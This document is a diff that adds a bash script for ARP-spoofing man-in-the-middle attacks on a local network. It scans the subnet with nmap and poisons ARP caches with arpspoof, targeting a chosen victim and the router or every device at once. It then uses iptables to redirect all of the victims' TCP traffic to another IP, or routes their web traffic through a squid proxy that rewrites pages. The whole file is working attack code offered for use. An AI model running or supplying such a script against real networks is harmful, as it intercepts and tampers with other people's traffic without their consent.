@@ -1,0 +1,123 @@
+#!/bin/bash
+
+# Wifi interface. May need changing
+WLAN=eth0
+
+# Detect a few settings
+
+IP=$(ifconfig $WLAN | grep "inet addr" | sed 's/[^:]*:\([^ ]*\) .*/\1/')
+echo Current Wifi IP: $IP
+
+SUBNET=$(route -n | grep $WLAN | awk '{print $1}' | head -n1)
+echo Current subnet: $SUBNET
+
+MASK=$(ifconfig $WLAN | grep Mask | sed 's/.*Mask:\([^ ]*\)/\1/')
+echo Subnet mask: $MASK
+SHORTMASK=24
+[ "$MASK" == "255.255.255.255" ] && SHORTMASK=31
+[ "$MASK" == "255.255.0.0" ] && SHORTMASK=16
+[ "$MASK" == "255.0.0.0" ] && SHORTMASK=8
+
+if [ "$#" -eq 0 ]
+then
+	echo "Listing hosts on subnet"
+	echo "To actually run a spoof, first specify the IP addresses of the victim and the router as arguments."
+	echo "Eg. $0 192.168.1.105 192.168.1.1"
+	echo "To run for all devices, use '*' as the first argument."
+	echo " "
+	echo "NOTE: The list below sometimes doesn't actually show anything for some reason."
+	nmap -sP $SUBNET/$SHORTMASK | grep "appears to be up"
+	exit
+fi
+
+if [ "$#" -eq 1 ]
+then
+	echo "Please specify router & pc as arguments"
+	exit 1
+fi
+
+if [ "$#" -eq 2 ]
+then
+	echo "Modes available:"
+	echo "	1 - redirect to ip address (next arg)"
+	echo "	2 - Transform script mode (default is Upside down mode)"
+	exit 1
+fi
+
+MODE="$3"
+OPT1="$4"
+case "$MODE" in
+	"1")
+		if [ "$#" -eq 3 ]
+		then
+			echo "No IP specified - using kittenwar"
+			OPT1="205.196.209.62"
+		fi
+		;;
+	"2")
+		if [ "$#" -eq 3 ]
+		then
+			echo "No script in /rewriters specified, using flip.pl"
+			echo "Specify a script after the option number to use a custom one."
+			echo "NOTE: If an invalid script is specified, nothing will happen!"
+			OPT1="flip.pl"
+		fi
+		;;
+	* )
+		echo "Please specify a valid option"
+		exit 1
+		;;
+esac
+
+
+if [ "$1" = '*' ]
+then
+	echo "Starting ARP Spoofing for all devices"
+	arpspoof -i $WLAN "$2" > /dev/null &
+	ARP1="$!"
+else
+	echo "Starting ARP Spoofing"
+	arpspoof -i $WLAN -t "$1" "$2" > /dev/null &
+	ARP1="$!"
+	arpspoof -i $WLAN -t "$2" "$1" > /dev/null &
+	ARP2="$!"
+fi
+
+case "$MODE" in
+	"1")
+		echo "Setting iptables"
+		iptables -t nat -A PREROUTING -s $SUBNET/$MASK -p tcp -j DNAT --to-destination $OPT1
+		;;
+	"2")
+		rm -f /usr/local/bin/rewrite
+		ln -s /rewriters/$OPT1 /usr/local/bin/rewrite
+		/etc/init.d/squid start
+		/etc/init.d/lighttpd start
+		iptables -t nat -A POSTROUTING -j MASQUERADE
+		iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+		;;
+esac
+
+# Wait for finish
+read
+
+kill $ARP1
+kill $ARP2
+
+# Stop stuff
+case "$MODE" in
+	"1")
+		echo "Unsetting iptables"
+		iptables -t nat -D PREROUTING -s $SUBNET/$MASK -p tcp -j DNAT --to-destination $OPT1
+		;;
+	"2")
+		iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 3128
+		iptables -t nat -D POSTROUTING -j MASQUERADE
+		/etc/init.d/squid stop
+		/etc/init.d/lighttpd stop
+		spoof-clean
+		;;
+esac
+
+
+wait
